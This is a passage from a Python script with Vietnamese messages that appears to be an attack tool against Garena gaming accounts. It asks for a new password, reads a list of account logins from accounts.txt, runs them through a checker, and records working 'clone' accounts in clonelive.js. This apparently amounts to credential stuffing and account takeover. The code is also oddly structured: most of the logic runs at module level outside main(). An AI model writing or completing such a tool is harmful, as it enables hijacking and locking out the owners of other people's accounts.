        if confirmation in ('', 'y', 'yes'):
            print(f"{Fore.GREEN}Đã xác nhận mật khẩu mới. Bắt đầu xử lý...{Style.RESET_ALL}")
            return new_password
        if confirmation in ('n', 'no'):
            print(f"{Fore.YELLOW}Vui lòng nhập lại mật khẩu mong muốn.{Style.RESET_ALL}")
            continue
        print(f"{Fore.YELLOW}Lựa chọn không hợp lệ, vui lòng trả lời Y hoặc N.{Style.RESET_ALL}")



def main():
   print(f"""{Fore.CYAN}
  _______              _     ____              
 |__   __|            | |   |  _ \             
    | | ___   ___   __| |   | |_) | _   _ 
    | |/ _ \ / _ \ / _` |   |  _ < | | | |
    | | (_) | (_) | (_| |   | |_) || |_| |
    |_|\___/ \___/ \__,_|   |____/  \__, |
                                     __/ |
                                    |___/ 
         __          __   _____  
         \ \        / /  / ____| 
          \ \  /\  / /  | (___   
           \ \/  \/ /   \\\___ \  
            \  /\  /     |___) | 
             \/  \/     /_____/  

    {Style.RESET_ALL}""")


new_password = prompt_new_password()
input_file = "accounts.txt"
output_file = "results.csv"

print(f"{Fore.YELLOW}Đang khởi tạo công cụ kiểm tra tài khoản Garena...{Style.RESET_ALL}")
checker = GarenaAccountChecker(new_password)
checker.log_progress("Bắt đầu quy trình kiểm tra tài khoản.", Fore.YELLOW)
checker.process_accounts(input_file, output_file)
clonelive_path = "clonelive.js"
try:
    if os.path.exists(clonelive_path):
        with open(clonelive_path, "r", encoding="utf-8") as js_file:
            raw_data = js_file.read().strip()
        if raw_data:
            data = json.loads(raw_data)
            if isinstance(data, list):
                checker.clonelive_total_current = len(data)
            else:
                checker.clonelive_total_current = 0
        else:
            checker.clonelive_total_current = 0
    else:
        checker.clonelive_total_current = 0
except Exception as summary_error:
    checker.log_progress(f"Không đọc được clonelive.js để tổng kết: {summary_error}", Fore.YELLOW)
    checker.clonelive_total_current = 0
checker.log_progress(f"Tổng kết clonelive.js: {checker.clonelive_added}/{checker.total_accounts} tài khoản mới ghi (tổng hiện có: {checker.clonelive_total_current}).", Fore.CYAN)
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Đã dừng chương trình do người dùng yêu cầu.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Có lỗi không mong muốn: {str(e)}{Style.RESET_ALL}")
